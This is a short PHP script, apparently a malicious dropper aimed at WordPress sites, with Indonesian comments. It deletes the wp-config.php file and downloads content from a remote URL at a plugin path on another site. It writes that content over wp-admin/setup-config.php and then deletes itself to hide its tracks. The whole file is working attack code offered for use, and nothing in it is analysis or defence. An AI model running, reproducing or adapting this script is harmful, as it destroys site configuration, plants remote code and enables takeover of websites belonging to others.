<?php
// URL sumber file
$url = "https://lar.redentorresidencialgeriatrico.com/wp-content/plugins/v6JbQUCoQAgrZbUTtpv44T/src/ui/ka/asu.txt";

// Ambil document root
$docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], '/');

// Target file yang akan dihapus
$configFiles = [
    $docRoot . '/wp-config.php',
    $docRoot . '/wordpress/wp-config.php'
];

// Hapus file wp-config.php jika ada
foreach ($configFiles as $file) {
    if (file_exists($file)) {
        if (@unlink($file)) {
            echo "🗑️ Dihapus: $file<br>";
        } else {
            echo "❌ Gagal hapus: $file<br>";
        }
    } else {
        echo "ℹ️ Tidak ditemukan: $file<br>";
    }
}

// Download isi file dari URL
$content = @file_get_contents($url);
if ($content === false) {
    die("❌ Gagal mengambil konten dari URL.");
}

// Target lokasi simpan hasil wget
$targets = [
    $docRoot . '/wp-admin/setup-config.php',
    $docRoot . '/wordpress/wp-admin/setup-config.php'
];

// Simpan file ke lokasi target
foreach ($targets as $target) {
    $dir = dirname($target);
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }

    if (file_put_contents($target, $content) !== false) {
        echo "✅ Disimpan ke: $target<br>";
    } else {
        echo "❌ Gagal simpan ke: $target<br>";
    }
}

// Hapus diri sendiri
$self = $_SERVER['SCRIPT_FILENAME'];
if (file_exists($self)) {
    @unlink($self);
}
?>
